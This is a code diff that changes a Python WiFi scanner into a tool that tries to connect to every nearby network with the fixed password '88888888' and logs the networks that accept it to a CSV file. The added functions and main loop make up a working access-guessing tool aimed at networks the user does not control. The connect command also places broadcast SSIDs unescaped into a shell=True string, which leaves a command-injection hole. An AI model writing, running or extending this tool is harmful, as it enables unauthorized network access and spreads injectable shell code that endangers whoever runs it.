@@ -6,6 +6,10 @@ Scans and displays available WiFi networks with signal strength, security inform
 
 import subprocess
 import sys
+import csv
+import os
+import time
+from datetime import datetime
 
 def run_command(cmd, fallback=None):
     """Run a command and return its output, or fallback if it fails."""
@@ -167,9 +171,60 @@ def check_current_connection():
     
     return None
 
+def test_wifi_connection(ssid, password="88888888", timeout=10):
+    """Test WiFi connection with given password."""
+    interface = get_wifi_interfaces()
+    if not interface:
+        return False
+    interface = interface[0]  # Use first available interface
+    
+    try:
+        # Try to connect using nmcli
+        cmd = f"nmcli dev wifi connect '{ssid}' password '{password}' iface {interface}"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        
+        if result.returncode == 0:
+            # Connection successful
+            time.sleep(2)  # Wait for connection to stabilize
+            # Test connectivity by pinging google
+            ping_test = subprocess.run("ping -c 1 -W 3 8.8.8.8", shell=True, capture_output=True, text=True)
+            if ping_test.returncode == 0:
+                return True
+        
+        return False
+    except (subprocess.SubprocessError, subprocess.TimeoutExpired):
+        return False
+    finally:
+        # Always disconnect after test
+        try:
+            subprocess.run(f"nmcli dev disconnect {interface}", shell=True, capture_output=True, timeout=5)
+        except:
+            pass
+
+def save_successful_connections(networks, output_file="tmp/wifi.csv"):
+    """Save successful WiFi connections to CSV file."""
+    # Create directory if it doesn't exist
+    os.makedirs(os.path.dirname(output_file), exist_ok=True)
+    
+    # Check if file exists to write header only if new file
+    is_new_file = not os.path.exists(output_file)
+    
+    with open(output_file, 'a', newline='', encoding='utf-8') as csvfile:
+        fieldnames = ['ssid', 'bssid', 'mode', 'channel', 'frequency', 'rate', 'bandwidth', 'signal', 'bars', 'security', 'active', 'in_use', 'password', 'test_time']
+        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+        
+        if is_new_file:
+            writer.writeheader()
+        
+        for net in networks:
+            row = net.copy()
+            row['password'] = '88888888'
+            row['test_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            writer.writerow(row)
+
 def main():
     """Main function to scan and display WiFi networks."""
-    print("=== WiFi Network Scanner ===")
+    print("=== WiFi Network Scanner with Password Testing ===")
     print()
     
     # Check current connection
@@ -185,17 +240,47 @@ def main():
     print("Available WiFi Networks:")
     if not networks:
         print("  No WiFi networks found or scanning method available")
+        return
+    
+    # Filter out empty SSIDs
+    available_networks = [net for net in networks if net['ssid'] and net['ssid'] != 'N/A' and net['ssid'].strip()]
+    
+    print(f"Found {len(available_networks)} networks to test...")
+    print()
+    
+    successful_connections = []
+    
+    for i, net in enumerate(available_networks, 1):
+        print(f"[{i}/{len(available_networks)}] Testing: {net['ssid']} (Security: {net['security']}, Signal: {net['signal']}%)")
+        
+        # Skip if network is already connected
+        if net.get('active') == 'yes' or net.get('in_use') == 'yes':
+            print(f"  Skipping - already connected")
+            continue
+            
+        # Test connection with password 88888888
+        if test_wifi_connection(net['ssid']):
+            print(f"  ✓ SUCCESS! Password 88888888 works for {net['ssid']}")
+            successful_connections.append(net)
+        else:
+            print(f"  ✗ Failed - password incorrect or connection error")
+        
+        # Small delay between tests
+        time.sleep(1)
+    
+    print()
+    print(f"Testing complete. Found {len(successful_connections)} network(s) with password 88888888.")
+    
+    if successful_connections:
+        save_successful_connections(successful_connections)
+        print(f"Results saved to tmp/wifi.csv")
+        print()
+        print("Successful connections:")
+        for net in successful_connections:
+            print(f"  - {net['ssid']} (Signal: {net['signal']}%, Security: {net['security']})")
     else:
-        for net in networks:
-            print(f"  SSID: {net['ssid']}, BSSID: {net['bssid']}, "
-                  f"Mode: {net['mode']}, Channel: {net['channel']}, Frequency: {net['frequency']}, "
-                  f"Rate: {net['rate']}, Bandwidth: {net['bandwidth']}, Signal: {net['signal']}%, "
-                  f"Bars: {net['bars']}, Security: {net['security']}, Active: {net['active']}, In-Use: {net['in_use']}")
-            # Add additional flag information if available
-            if net.get('wpa_flags') and net['wpa_flags'] != 'N/A':
-                print(f"    WPA-Flags: {net['wpa_flags']}")
-            if net.get('rsn_flags') and net['rsn_flags'] != 'N/A':
-                print(f"    RSN-Flags: {net['rsn_flags']}")
+        print("No networks accepted the password 88888888.")
+    
     print()
 
 if __name__ == "__main__":
